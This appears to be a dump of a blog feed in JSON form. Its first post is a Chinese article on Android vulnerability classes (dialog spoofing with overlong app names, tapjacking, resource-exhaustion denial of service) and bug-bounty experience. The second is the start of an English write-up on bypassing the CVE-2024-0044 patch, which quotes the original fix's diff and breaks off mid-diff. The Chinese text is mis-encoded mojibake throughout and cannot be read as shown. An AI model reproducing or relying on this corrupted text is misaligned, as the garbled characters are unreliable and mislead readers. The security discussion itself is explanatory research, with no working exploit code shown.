çš„æ¼æ´ã€‚CVE-2018-9432ï¼šä¸€ä¸ªå°å°çš„å­—ç¬¦ä¸²èƒ½æœ‰ä»€ä¹ˆåå¿ƒæ€å‘¢ï¼Ÿå‡å¦‚è¯´ï¼Œä½ æ˜¯ç³»ç»Ÿå¼€å‘è€…ï¼Œä½ è‡ªå®šä¹‰äº†ä¸€ä¸ªç‰¹æƒæ“ä½œï¼Œæ¯”å¦‚ä»ç”¨æˆ·ç»‘å®šçš„é’±åŒ…é‡Œåˆ’èµ°ä¸€ç™¾å—ï¼ŒåŒæ—¶å…è®¸åº”ç”¨è°ƒç”¨ä½ å®šä¹‰çš„æ¥å£è¯·æ±‚è¿™ä¸ªæ“ä½œï¼Œé‚£è‚¯å®šå¾—éœ€è¦å¾—åˆ°ç”¨æˆ·æ˜ç¡®å…è®¸æ‰è¡Œã€‚ä¸€èˆ¬çš„åšæ³•æ˜¯è®¾è®¡ä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶ä¸­ &lt;appname&gt; ä»£è¡¨å‘èµ·è¯·æ±‚çš„åº”ç”¨åç§°ï¼š123&lt;appname&gt; æ­£åœ¨è¯·æ±‚æ¶ˆè´¹ 100 å…ƒäººæ°‘å¸ï¼Œæ­¤ç¬”æ¬¾é¡¹å°†ä¼šä»æ‚¨çš„é’±åŒ…ä¸­æ‰£é™¤ã€‚æ‚¨ç¡®è®¤è¦æ”¯ä»˜å—ï¼Ÿå–æ¶ˆ ç¡®è®¤è€Œå¦‚æœæˆ‘ä»¬å°†åº”ç”¨åè®¾ç½®çš„ç‰¹åˆ«é•¿ï¼Œä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿæˆ‘ä»¬ç²¾å¿ƒè®¾ç½®ä¸€ä¸ªè¶…é•¿çš„åº”ç”¨åï¼Œå®ƒä¼šè¿™æ ·æ˜¾ç¤ºï¼š1234567891011121314151617&lt;XX åº”ç”¨éœ€è¦æ‚¨åŒæ„éšç§åè®®ã€‚XX åº”ç”¨éšç§åè®®ï¼š1. æœ¬åº”ç”¨ç”± xxx å…¬å¸å¼€å‘ã€‚2. æœ¬åº”ç”¨åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œéœ€è¦ä»¥ä¸‹æƒé™è¿è¡Œï¼š(1). ç½‘ç»œæƒé™ã€‚æœ¬åº”ç”¨éœ€è¦æ­¤æƒé™ä»¥è¿æ¥æœåŠ¡å™¨ã€å‘æœåŠ¡å™¨å‘é€æ•°æ®å¹¶æ‹‰å–æ•°æ®ã€‚æ‚¨å¿…é¡»æˆäºˆæ­¤æƒé™ã€‚(2). å­˜å‚¨å¡æƒé™ã€‚æœ¬åº”ç”¨éƒ¨åˆ†åŠŸèƒ½éœ€è¦è¯»å†™æ‚¨çš„ç…§ç‰‡ã€ç¬”è®°ç­‰å†…å®¹ï¼Œå› æ­¤éœ€è¦å­˜å‚¨å¡æƒé™ã€‚æˆ‘ä»¬ä¸ä¼šæ»¥ç”¨é€šè¿‡æ­¤æƒé™è·å¾—çš„æ•°æ®ï¼Œä¹Ÿä¸ä¼šå°†å…¶æŒä¹…åŒ–å­˜å‚¨æˆ–ä¸Šä¼ åˆ°ç½‘ç»œã€‚æˆ‘ä»¬åªåœ¨æ‚¨ä½¿ç”¨ç‰¹å®šåŠŸèƒ½æ—¶è¯·æ±‚æ­¤æƒé™ï¼Œæ‚¨ä¹Ÿå¯ä»¥éšæ—¶æ‹’ç»æˆ–æ’¤é”€æ­¤æƒé™ã€‚ä¸æˆäºˆæ­¤æƒé™ä¸ä¼šå¯¹å…¶ä»–åŠŸèƒ½äº§ç”Ÿå½±å“ã€‚.......å¦‚æ‚¨åŒæ„æ­¤åè®®ï¼Œè¯·ç‚¹å‡»â€œç¡®è®¤â€ç»§ç»­è¿è¡Œã€‚å¦‚æ‚¨æ‹’ç»æ­¤åè®®ï¼Œæœ¬åº”ç”¨æ— æ³•è¿è¡Œå¹¶å°†è‡ªåŠ¨é€€å‡ºã€‚&gt; æ­£åœ¨è¯·æ±‚æ¶ˆè´¹ 100 å…ƒäººæ°‘å¸ï¼Œæ­¤ç¬”æ¬¾é¡¹å°†ä¼šä»æ‚¨çš„é’±åŒ…ä¸­æ‰£é™¤ã€‚æ‚¨ç¡®è®¤è¦æ”¯ä»˜å—ï¼Ÿå–æ¶ˆ ç¡®è®¤è¿™é‡Œç”¨ &lt;&gt; æ‹¬èµ·æ¥çš„ä¸€å¤§æ®µå…¶å®éƒ½æ˜¯åº”ç”¨åã€‚è€Œå—é™äºå±å¹•å¤§å°é™åˆ¶ï¼Œå¯¹è¯æ¡†æ˜¾ç¤ºçš„æ—¶å€™åªèƒ½æ˜¾ç¤ºå‰é¢çš„åº”ç”¨åï¼ŒçœŸæ­£çš„â€œæ­£åœ¨è¯·æ±‚æ¶ˆè´¹â€ä¿¡æ¯è¢«æŒ¤ä¸‹å»äº†ã€‚å¦‚æœç”¨æˆ·æ²¡æœ‰æ³¨æ„åˆ°å¯¹è¯æ¡†æ–‡æœ¬å¯ä»¥æ»‘åŠ¨ï¼ˆäº‹å®ä¸Šå°±ç®—æ³¨æ„åˆ°äº†ï¼Œä¼°è®¡ä¹Ÿä¼šè®¤ä¸ºå‰©ä¸‹çš„å…¨æ˜¯åˆè‡­åˆé•¿çš„åè®®ï¼‰ï¼Œç›´æ¥ç‚¹äº†ç¡®è®¤ï¼Œå°±ä¼šä¸çŸ¥ä¸è§‰é—´æŸå¤±è´¢äº§ã€‚å®é™…ç”Ÿæ´»ä¸­çš„æ”¯ä»˜å¯¹è¯æ¡†å½“ç„¶ä¸å¯èƒ½è®¾è®¡çš„è¿™ä¹ˆç®€å•ï¼Œä½†å†å²ä¸Šç¡®å®å‡ºç°è¿‡æ­¤ç±»æ¼æ´ï¼Œå¦‚ CVE-2015-3878 å±å¹•å½•åˆ¶æˆæƒæ¬ºéª—æ¼æ´ã€CVE-2017-13242 è“ç‰™é…å¯¹æ¬ºéª—æ¼æ´ã€CVE-2018-9432: è“ç‰™é€šè®¯å½•è®¿é—®æ¬ºéª—æ¼æ´ç­‰ã€‚æ„Ÿå…´è¶£çš„å¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼šAndroid ä¸­çš„ç‰¹æ®Šæ”»å‡»é¢ï¼ˆä¸€ï¼‰â€”â€”é‚ªæ¶çš„å¯¹è¯æ¡†é«˜ç‰ˆæœ¬ Android ç³»ç»Ÿå¯¹è¯æ¡†åšäº†ä¸€äº›æ›´æ”¹ï¼Œå¦‚æƒé™è¯·æ±‚å¯¹è¯æ¡†çš„â€œå…è®¸â€â€œæ‹’ç»â€é€‰é¡¹ç°åœ¨å’Œå¯¹è¯æ¡†çš„å†…å®¹æ”¾åœ¨ä¸€èµ·ï¼Œç”¨æˆ·å¿…é¡»å®Œå…¨æ»šåŠ¨åˆ°æœ€ä¸‹æ–¹æ‰èƒ½ç‚¹åˆ°æŒ‰é’®ï¼Œç®—æ˜¯åŸºæœ¬æœç»äº†æ­¤ç±»æ¼æ´ã€‚CVE-2021-0314ï¼šUI è¦†ç›–ä¸ç‚¹æŒ‰åŠ«æŒAndroid æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸åº”ç”¨åœ¨å…¶ä»–åº”ç”¨ä¹‹ä¸Šæ˜¾ç¤ºå†…å®¹ï¼Œé€šå¸¸ç®€ç§°ä¸ºâ€œæ‚¬æµ®çª—â€ã€‚æ—©åœ¨ Android 4.x æ—¶ä»£ï¼Œæ¶æ„å¼€å‘è€…å°±å·²ç»æ»¥ç”¨è¿™ä¸ªæƒé™åˆ¶ä½œæ¶æ„è½¯ä»¶ï¼Œå¦‚åœ¨è®¾å¤‡å¼€æœºæ—¶æ˜¾ç¤ºå…¨å±æ‚¬æµ®çª—é˜»æ­¢ç”¨æˆ·ä½¿ç”¨æ‰‹æœºï¼Œä»è€Œå‹’ç´¢é’±è´¢ï¼Œå³æ‰€è°“çš„â€œé”æœºè½¯ä»¶â€ã€‚é€šè¿‡è¿™ä¸ªåŠŸèƒ½ï¼Œè¿˜å¯ä»¥å®ç°å¾ˆå¤šæœ‰æ„ä¹‰çš„æ”»å‡»ã€‚è¿˜æ˜¯ä»¥ä¸Šé¢çš„å¯¹è¯æ¡†ä¸ºä¾‹ï¼Œè¿™æ¬¡æˆ‘ä»¬ä¸ä½¿ç”¨è¶…é•¿åº”ç”¨åç§°ï¼Œè€Œæ˜¯åˆ©ç”¨æ‚¬æµ®çª—åŠŸèƒ½ï¼Œåœ¨å¯¹è¯æ¡†æ˜¾ç¤ºçš„åŒæ—¶è¦†ç›–æˆ‘ä»¬è‡ªå·±çš„å†…å®¹åˆ°å¯¹è¯æ¡†çš„æ–‡æœ¬ä¸Šé¢ï¼Œç”¨æˆ·å¾ˆå®¹æ˜“å°±ä¼šè¢«è¯¯å¯¼ç‚¹å‡»ç¡®è®¤ã€‚è¿™ç§ç±»å‹çš„æ”»å‡»å«åšç‚¹æŒ‰åŠ«æŒæ”»å‡»ï¼ˆTapjacking Attackï¼‰ã€‚å¯¹å¤§éƒ¨åˆ†æƒ…å†µæ¥è¯´ï¼Œèƒ½å¤Ÿè¢«å…¶ä»–åº”ç”¨è¦†ç›–å¹¶ä¸æ˜¯å®‰å…¨é—®é¢˜ï¼Œè€Œå¯¹äºæ•æ„Ÿå¯¹è¯æ¡†ï¼Œå¯ä»¥é€šè¿‡ç”³è¯· HIDE_NON_SYSTEM_OVERLAY_WINDOWS æƒé™å¹¶å¯¹å½“å‰ window æ·»åŠ  SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS è¿™ä¸ªå±æ€§æˆ–è°ƒç”¨ setHideOverlayWindows æ¥éšè—æ‰€æœ‰çš„éç³»ç»Ÿæ‚¬æµ®çª—ï¼Œè¿˜å¯ä»¥é€šè¿‡ filterTouchesWhenObscured onFilterTouchEventForSecurity ç­‰ API è¿‡æ»¤å¯èƒ½è¢«åŠ«æŒçš„è¾“å…¥äº‹ä»¶ã€‚ä½†å®é™…ä¸Šï¼ŒAndroid ç³»ç»Ÿè‡ªèº«ä¹Ÿå‡ºç°è¿‡å¤šä¸ªå¿˜è®°å¯¹æ•æ„Ÿå¯¹è¯æ¡†ä½¿ç”¨é˜²å¾¡æªæ–½çš„æ¼æ´ï¼Œå¦‚æ­¤ä¾‹çš„ CVE-2021-0314 ä¾¿æ˜¯å¸è½½åº”ç”¨çš„ç¡®è®¤å¯¹è¯æ¡†ã€‚æƒ³è¦äº†è§£æ›´å¤šï¼Œå¯ä»¥æŸ¥çœ‹ä»¥ä¸‹æ–‡ç« ï¼šGoogle å®˜æ–¹å¯¹ç‚¹æŒ‰åŠ«æŒçš„ä»‹ç»ä¸å¯å¿½è§†çš„å¨èƒï¼šAndroidä¸­çš„ç‚¹å‡»åŠ«æŒæ”»å‡»å®ä¸ºç‰ç¢ â€”â€” æ‹’ç»æœåŠ¡ç±»æ”»å‡»Android çš„æ¼æ´åˆ†ç±»ä¸­ï¼Œè¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„æ¼æ´ï¼Œæ—¢ä¸èƒ½åƒå½±è§†å‰§é‡Œçš„é»‘å®¢ä¸€æ ·æ•²æ•²é”®ç›˜å…¥ä¾µæ•Œå›½æ ¸å¼¹ç³»ç»Ÿï¼Œä¹Ÿä¸èƒ½æ³„æ¼åˆ«äººçš„é“¶è¡Œå¡å¯†ç ï¼Œå®ƒèƒ½åšçš„åªæœ‰ä½¿æ‰‹æœºå·¥ä½œå‡ºç°å¼‚å¸¸ã€‚å®ƒå°±æ˜¯æ‹’ç»æœåŠ¡ç±»æ¼æ´ã€‚è™½ç„¶ä¸åƒ RCEã€EoPã€ID é‚£ä¹ˆäº®çœ¼ï¼Œä½†ä¹Ÿä¸èƒ½å°çœ‹è¿™ç±»ä¸€ä¸å°å¿ƒå°±è®©ä½ æ‰‹æœºå˜ç –å¤´çš„æ¼æ´ã€‚åœ¨ Android çš„æ¼æ´ä¸¥é‡ç¨‹åº¦å®šä¹‰ä¸­ï¼Œæœ‰å¦‚ä¸‹å†…å®¹ï¼šä¸¥é‡ï¼ˆCriticalï¼‰ï¼šè®¾å¤‡é­åˆ°è¿œç¨‹å‘èµ·çš„æŒä¹…æ€§æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆæ°¸ä¹…æ€§æŸåã€éœ€è¦é‡æ–°åˆ·å†™æ•´ä¸ªæ“ä½œç³»ç»Ÿæˆ–æ¢å¤å‡ºå‚è®¾ç½®ï¼‰é«˜ï¼ˆHighï¼‰ï¼šè®¾å¤‡é­åˆ°æœ¬åœ°å‘èµ·çš„æŒä¹…æ€§æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆæ°¸ä¹…æ€§æŸåã€éœ€è¦é‡æ–°åˆ·å†™æ•´ä¸ªæ“ä½œç³»ç»Ÿæˆ–æ¢å¤å‡ºå‚è®¾ç½®ï¼‰ï¼›æ”»å‡»è€…å¯ä»¥åœ¨æ²¡æœ‰ç”¨æˆ·äº’åŠ¨çš„æƒ…å†µä¸‹è¿œç¨‹é˜»æ­¢å¯¹ç§»åŠ¨ç½‘ç»œæˆ– Wi-Fi æœåŠ¡çš„è®¿é—®ï¼ˆä¾‹å¦‚ï¼Œç”¨æ ¼å¼ä¸æ­£ç¡®çš„æ•°æ®åŒ…ä½¿ç§»åŠ¨ç½‘ç»œæ— çº¿è£…ç½®æœåŠ¡å´©æºƒï¼‰ä¸­ï¼ˆModerateï¼‰ï¼šè®¾å¤‡é­åˆ°è¿œç¨‹å‘èµ·çš„è®¾å¤‡æš‚æ—¶æ€§æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆè¿œç¨‹æŒ‚èµ·æˆ–é‡æ–°å¯åŠ¨è®¾å¤‡ï¼‰èƒ½è¾¾åˆ°â€œä¸¥é‡â€ç¨‹åº¦çš„ DoS æ¼æ´å¾ˆå°‘è§ï¼Œçœ‹è§è¿‡çš„å‡ ä¸ªéƒ½æ˜¯ TextView æ–‡å­—æ¸²æŸ“çš„å´©æºƒæˆ–è€…æ­»å¾ªç¯ã€‚æˆ‘ä»¬ä¸»è¦ç„å‡†ä¸¥é‡ç¨‹åº¦â€œé«˜â€çš„æ¼æ´ã€‚æƒ³è¦â€œæŒä¹…æ€§æ‹’ç»æœåŠ¡æ”»å‡»â€ï¼Œæ¯”å¦‚è®©æ‰‹æœºç³»ç»Ÿå´©æºƒå¼€ä¸äº†æœºæ— é™é‡å¯ï¼Œé™¤äº†åˆ©ç”¨ç³»ç»Ÿæœ¬èº«çš„ç¼ºé™·ï¼Œå¾ˆå®¹æ˜“èƒ½æƒ³åˆ°çš„è¿˜æœ‰ä¼ ç»Ÿ DoS ä¸­çš„â€œèµ„æºè€—å°½â€ï¼Œç®€å•æ¥è¯´ï¼Œå ç”¨ç³»ç»Ÿå¤§é‡èµ„æºä½¿å…¶åœæ­¢å·¥ä½œã€‚ä½†æ˜¯ï¼Œè®© system_server å´©æºƒä¸€æ¬¡æœ€å¤šåªä¼šé€ æˆç³»ç»Ÿè½¯é‡å¯ä¸€æ¬¡ï¼Œå¹¶ä¸ç®—æŒä¹…ã€‚æ€ä¹ˆæ ·æ‰èƒ½æŒä¹…å‘¢ï¼Ÿâ€œæŒä¹…â€ï¼Œè¿™ä¸¤ä¸ªå­—èƒ½æè¿°çš„ä¸œè¥¿ï¼Œè¿˜æœ‰æ•°æ®ã€‚å¦‚æœèƒ½å¤Ÿå°†æ¶æ„çš„æ•°æ®ä¿å­˜ä¸‹æ¥ï¼Œç³»ç»Ÿæ¯æ¬¡å¯åŠ¨å°è¯•å»è¯»å–å®ƒçš„æ—¶å€™å°±éƒ½ä¼šå´©æºƒï¼Œé™·å…¥æ­»å±€ã€‚è€Œæ‰€è°“â€œèƒ½è®©ç³»ç»Ÿå´©æºƒçš„æ¶æ„æ•°æ®â€é™¤äº†ç²¾å¿ƒæ„é€ çš„ã€åˆ©ç”¨ä»£ç æœ¬èº«é—®é¢˜çš„æ•°æ®ï¼Œå¾ˆå®¹æ˜“èƒ½æƒ³åˆ°çš„è¿˜æœ‰è¶…å¤§é‡çš„æ•°æ®ï¼Œåœ¨ç³»ç»Ÿå¤„ç†çš„è¿‡ç¨‹ä¸­è€—å°½ç³»ç»Ÿå†…å­˜èµ„æºè§¦å‘å´©æºƒã€‚ä»¥ CVE-2021-0934 ä¸ºä¾‹ï¼ŒAccount å°±æ˜¯è¦è¢«æŒä¹…åŒ–å­˜å‚¨çš„æ•°æ®ï¼Œè™½ç„¶å·²ç»è€ƒè™‘åˆ°ç³»ç»Ÿèµ„æºè´Ÿæ‹…ï¼Œå¯¹ Account å†…å­—ç¬¦ä¸²çš„å¤§å°åŠ Account æ•°é‡åšå‡ºé™åˆ¶ï¼Œç„¶è€Œå­—ç¬¦ä¸²å¤§å°é™åˆ¶åœ¨å®¢æˆ·ç«¯ï¼Œèƒ½è¢«ç»•è¿‡ã€‚è¿™é‡Œæ³¨æ„ï¼Œbinder ä¸€æ¬¡èƒ½ä¼ è¾“æ•°æ®çš„å¤§å°ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ï¼Œå¤§æ¦‚åœ¨ 1mb å·¦å³ï¼Œæ‰€ä»¥è¿˜ä¸èƒ½ä¸€æ¬¡ä¼ å¤ªå¤§ï¼Œåªèƒ½ä¸€ä¸ªä¸€ä¸ªä¼ ã€‚åƒè¿™æ ·çš„æ¼æ´è¿˜æœ‰å¾ˆå¤šï¼Œç³»ç»Ÿå¼€å‘è€…è®¾è®¡æ¥å£æ—¶ä¸€ä¸å°å¿ƒå¿˜è®°åŠ ä¸Šé™åˆ¶å°±æœ‰å¯èƒ½å˜æˆä¸€ä¸ª CVEï¼Œå¦‚ CVE-2022-20494ã€‚è¿™ç§ä¸€ç‚¹ä¸€ç‚¹å¢å¤§ç³»ç»Ÿèµ„æºè´Ÿè½½çš„æ”»å‡»å¾ˆåƒæˆè¯­â€œå‹æ­»éª†é©¼çš„æœ€åä¸€æ ¹ç¨»è‰â€çš„æ•…äº‹ï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä¸ºç¨»è‰æ”»å‡»ï¼ˆStraw Attackï¼‰ã€‚å¤æ—¦å¤§å­¦æœ‰ä¸€ç¯‡è®ºæ–‡ã€ŠExploit the Last Straw That Breaks Android Systemsã€‹ï¼Œå‘è¡¨åœ¨ IEEE Symposium on Security and Privacy. 2022 ä¸Šï¼Œä¸“é—¨ä»‹ç»è¿™ç±»æ”»å‡»æ‰‹æ³•ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥çœ‹ä¸€ä¸‹ã€‚è‹±æ–‡ä¸å¤ªå¥½çš„åŒå­¦ä¹Ÿå¯ä»¥çœ‹çœ‹è¿™ç¯‡è¯‘æ–‡ã€Šç¨»è‰æ”»å‡»ï¼šå‹æ­»å®‰å“ç³»ç»Ÿçš„æœ€åä¸€æ ¹ç¨»è‰ã€‹ã€‚ï¼ˆè¿™ç®—æ˜¯æŠŠä¸­æ–‡ç¿»è¯‘æˆè‹±æ–‡åˆç¿»è¯‘æˆä¸­æ–‡å—ï¼Ÿï¼‰æ‰©å±•é˜…è¯»ä¸Šé¢çš„æ–‡ç« é‡Œæ”¾äº†å¾ˆå¤šæ–‡ç« ï¼Œè¿™é‡Œå†æ”¾ä¸€äº›åŒæ ·å¾ˆä¼˜ç§€çš„æ‰©å±•ç±»æ–‡ç« ã€‚å¼ºçƒˆå»ºè®®é˜…è¯» OPPO å‡ ä¸ªå¾®ä¿¡å…¬ä¼—å·å‘å¸ƒçš„ç³»åˆ—æ–‡ç« ã€‚å°è·¯ï¼šAndroid ç³»ç»Ÿå®‰å…¨å’Œé»‘ç°äº§å¯¹æŠ—OPPO å®‰ç€å®éªŒå®¤ï¼šAndroid Java Framework æ¼æ´æŒ–æ˜å¿«é€Ÿä¸Šæ‰‹æ–¹æ³•OPPO å®‰ç€å®éªŒå®¤ï¼šAndroid æœ¬åœ°æœåŠ¡æ¼æ´æŒ–æ˜æŠ€æœ¯ è¿™é‡Œåªæ”¾äº†ä¸Šç¯‡çš„é“¾æ¥ï¼Œå‰©ä¸‹ä¸¤ç¯‡è‡ªå·±å»å¾®ä¿¡å…¬ä¼—å·çœ‹å§â€¦â€¦ç»“è¯­æœ¬æ–‡ä»‹ç»äº†å¤§é‡ Android ç³»ç»Ÿä¸­çš„æ¼æ´ï¼Œå¹¶å°è¯•æ€»ç»“å‡ºä¸€äº›å¸¸è§ç±»å‹ï¼Œå¸Œæœ›èƒ½ç»™å¯¹ Android ç³»ç»Ÿå®‰å…¨æ„Ÿå…´è¶£çš„äººä¸€ç‚¹å¸®åŠ©ã€‚å½“ç„¶ï¼Œå¦‚æœä½ æƒ³æˆä¸ºä¸€åä¸“ä¸šçš„ Android å®‰å…¨ç ”ç©¶å‘˜ï¼Œä¼ ç»ŸäºŒè¿›åˆ¶æ¼æ´å¦‚ buffer overflowã€use-after-free ç­‰ä¹Ÿè‚¯å®šæ˜¯éœ€è¦äº†è§£çš„ã€‚æˆ‘ä¸ªäººè§‰å¾—ï¼Œå…¥é—¨å­¦ä¹  Android å®‰å…¨æœ€å¥½çš„æ—¶é—´æ˜¯ 2023 å¹´ä¹‹å‰ã€‚åœ¨ 2023 å¹´ä¹‹å‰ï¼Œåªè¦é™„ä¸Šä¸€ä»½é«˜è´¨é‡çš„æ¼æ´æè¿°ï¼Œå•ä¸ª moderate çº§åˆ«æ¼æ´å°±èƒ½è·å¾— $2000 å¥–åŠ±ï¼ŒHigh/Critical æ›´é«˜ï¼Œè€Œä¸”åªè¦æ˜¯æœ‰æ•ˆæ¼æ´ï¼ŒGoogle ç»™äºˆçš„æ¼æ´åˆ†çº§ä¸€èˆ¬éƒ½ä¸ä¼šä½äº moderateã€‚å¦‚æœæäº¤äº†è¡¥ä¸ä¸”è¢«æ¥å—ï¼Œå°±æœ‰æœºä¼šé¢å¤–å†åŠ  $1000ã€‚ç„¶è€Œï¼Œä» 2023 å¹´ 5 æœˆå¼€å§‹ï¼Œmoderate çº§åˆ«æ¼æ´å¥–é‡‘å¤§å¹…ç¼©æ°´ï¼Œæœ€é«˜åªæœ‰ $250ï¼Œä¸”å¤§éƒ¨åˆ†æ­¤çº§åˆ«æ¼æ´ä¸å†è¢«åˆ†é… CVEã€‚ç¬”è€…æ›¾ç»æäº¤è¿‡ Moderate Severity + Medium Quality çš„ bug reportï¼Œå¾—åˆ°çš„å›å¤æ˜¯ä¸ç¬¦åˆå¥–åŠ±æ ‡å‡†ã€‚å³ä½¿è·å¾—å¥–é‡‘ï¼ŒGoogle çš„åŠ¨ä½œä¹Ÿå®åœ¨æ˜¯æœ‰äº›æ…¢ã€‚ç¬”è€…æ›¾ç»è¯¢é—®è¿‡å¥–é‡‘è¿›åº¦ï¼Œå¾—åˆ°çš„å›å¤æ˜¯è¿™æ ·çš„ï¼šHello,Thanks for reaching out. Rewards are processed at 90 days after submission and once it has been processed, you will receive an email with details on the next steps to collect the reward.Best Regards,Android Security Teamå—¯ï¼Œ90 å¤©ï¼ŒOnly Google can doã€‚è€Œå¯¹äºä¸€ä¸ªè¢«ç¡®è®¤çš„å®‰å…¨æ¼æ´çš„ç”Ÿå‘½å‘¨æœŸæ˜¯è¿™æ ·çš„ï¼šInitial severity rating assessment (subject to change after review by component owners) (3)Development of an updateAssignment of CVEShared under NDA, as part of coordinated disclosure, to Android partners for remediationRelease in a public Android security bulletinAndroid Security Rewards payment (if applicable)è€Œ Google çš„æ…¢ä¼šä½“ç°åœ¨æ¯ä¸€æ­¥ä¸Šï¼Œç¬¬ä¸€æ­¥çš„è¯„çº§å°±æœ‰å¯èƒ½èŠ±å‡ ä¸ªæœˆã€‚å³ä½¿å†…éƒ¨å·²ç»å†™å‡ºæ¥äº†ä¿®å¤ï¼ŒGoogle ä¹Ÿè¦é¦–å…ˆå‘æ‰€æœ‰åˆä½œä¼™ä¼´å…±äº«è¯¥æ¼æ´ï¼Œç„¶åè‡³å°‘ç­‰ä¸€ä¸ªæœˆæ‰ä¼šåœ¨æ¯æœˆå®‰å…¨å…¬å‘Šä¸­å‘å¸ƒã€‚ä¸è¿‡å€¼å¾—é«˜å…´çš„ä¸€ç‚¹æ˜¯ï¼Œå¤§éƒ¨åˆ†æ—¶å€™æ¼æ´èµé‡‘éƒ½ä¼šåœ¨æ¼æ´è¢«ä¿®å¤ä¹‹å‰å°±ç»™ä½ ã€‚å¾ˆæ˜æ˜¾ï¼Œå¦‚æœä½ æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å®‰å…¨ç ”ç©¶å‘˜ï¼ŒæŒ‡æœ›é æŒ–æ´åƒé¥­ï¼Œå…ˆä¸è®ºä½ èƒ½æ‰¾åˆ°å¤šå°‘æ´è·å¾—å¤šå°‘é’±ï¼Œå°±è¿™ä¸ªé€Ÿåº¦ï¼Œä¼°è®¡ä½ åœ¨é’±åˆ°æ‰‹ä¸Šä¹‹å‰å°±é¥¿æ­»äº†ã€‚å½“ç„¶ï¼Œå¦‚æœä½ èƒŒåæœ‰ç€ä¸“ä¸šçš„å®‰å…¨å…¬å¸æˆ–è€…å›¢é˜Ÿï¼Œæˆ–è€…å°±æ˜¯å¯¹å®‰å…¨æ„Ÿå…´è¶£æƒ³æ¥è¯•è¯•ï¼Œé‚£å¯ä»¥å½“æˆ‘æ²¡è¯´ã€‚æˆ‘ç›¸ä¿¡äººçš„å…´è¶£æ¥äº†æ²¡æœ‰äººèƒ½æŒ¡ä½ï¼Œå°±åƒä»¥å‰çš„æˆ‘ä¸€æ · ï¼ˆä½ å…ˆæŠŠä½ è„‘å­æ²»å¥½å†è¯´è¯æ‰èƒ½è®©äººä¿¡æœï¼‰ã€‚å¦‚æœä½ ä»ç„¶æ„¿æ„æŠ•å…¥æ—¶é—´ç²¾åŠ›ç ”ç©¶ï¼Œé‚£æˆ‘ç›¸ä¿¡ä½ ä¸ä¼šè¢«äºå¾…ã€‚æ®‹é¡µ äº 2025/01/29ï¼šåŸæœ¬åœ¨è¿™é‡Œå†™äº†ä¸ªå¤©é“é…¬å‹¤çš„ï¼Œæœ€åè¿˜æ˜¯åˆ äº†ã€‚ç¥å¤§å®¶éƒ½èƒ½æ‰¾åˆ°è‡ªå·±çš„å¹¸ç¦","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Reviving an already patched vulnerability for half a year? The second spring of CVE-2024-0044","slug":"CVE-2024-0044","date":"2024-10-08T00:00:00.000Z","updated":"2025-04-24T10:33:02.808Z","comments":true,"path":"2024/10/08/CVE-2024-0044/","link":"","permalink":"https://blog.canyie.top/2024/10/08/CVE-2024-0044/","excerpt":"This is a bypass of the initial patch of CVE-2024-0044, a High severity vulnerability in the Android framework that allows attackers with adb access to execute arbitrary code under the UID of arbitrary app.The following is copied from my repo https://github.com/canyie/CVE-2024-0044 for backup purposes. For more info such as PoC code, please check the original repo.","text":"This is a bypass of the initial patch of CVE-2024-0044, a High severity vulnerability in the Android framework that allows attackers with adb access to execute arbitrary code under the UID of arbitrary app.The following is copied from my repo https://github.com/canyie/CVE-2024-0044 for backup purposes. For more info such as PoC code, please check the original repo.BasicsCVE-2024-0044/A-307532206 is a High severity vulnerability in the Android framework that allows attackers with adb access to run arbitrary code under the UID of arbitrary app. It was originally found by Tom Hebb from Meta Red Team X. You can found many articles on exploit this vulnerability on the Internet such as this and this. For more info, check this blog: https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.htmlThe patch for this vulnerability is included in the March 2024 Android Security Bulletin, but now I come up with an exploit that bypasses the patch. The new patch is included in October 2024 Android Security Bulletin under the same CVE ID CVE-2024-0044. Android 12-13 devices with security patch level before 2024-10-01 are vulnerable to this issue.The repo contains a minimum reproducible PoC and a writeup.Whatâ€™s wrong with the original patch?The patch added a validation for installer package name passed to the PackageManagerService:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657diff --git a/services/core/java/com/android/server/pm/PackageInstallerService.java b/services/core/java/com/android/server/pm/PackageInstallerService.javaindex 2ca3e8f..02515cf 100644--- a/services/core/java/com/android/server/pm/PackageInstallerService.java+++ b/services/core/java/com/android/server/pm/PackageInstallerService.java@@ -47,6 +47,7 @@ import android.content.pm.PackageManager; import android.content.pm.ParceledListSlice; import android.content.pm.VersionedPackage;+import android.content.pm.parsing.ParsingPackageUtils; import android.graphics.Bitmap; import android.net.Uri; import android.os.Binder;@@ -601,17 +602,22 @@ // App package name and label length is restricted so that really long strings aren't // written to disk.- if (params.appPackageName != null- &amp;&amp; params.appPackageName.length() &gt; SessionParams.MAX_PACKAGE_NAME_LENGTH) &#123;+ if (params.appPackageName != null &amp;&amp; !isValidPackageName(params.appPackageName)) &#123; params.appPackageName = null; &#125; params.appLabel = TextUtils.trimToSize(params.appLabel, PackageItemInfo.MAX_SAFE_LABEL_LENGTH); - String requestedInstallerPackageName = (params.installerPackageName != null- &amp;&amp; params.installerPackageName.length() &lt; SessionParams.MAX_PACKAGE_NAME_LENGTH)- ? params.installerPackageName : installerPackageName;+ // Validate installer package name.+ if (params.installerPackageName != null &amp;&amp; !isValidPackageName(+ params.installerPackageName)) &#123;+ params.installerPackageName = null;+ &#125;++ String requestedInstallerPackageName =+ params.installerPackageName != null ? params.installerPackageName+ : installerPackageName; if ((callingUid == Process.SHELL_UID) || (callingUid == Process.ROOT_UID)) &#123; params.installFlags |= 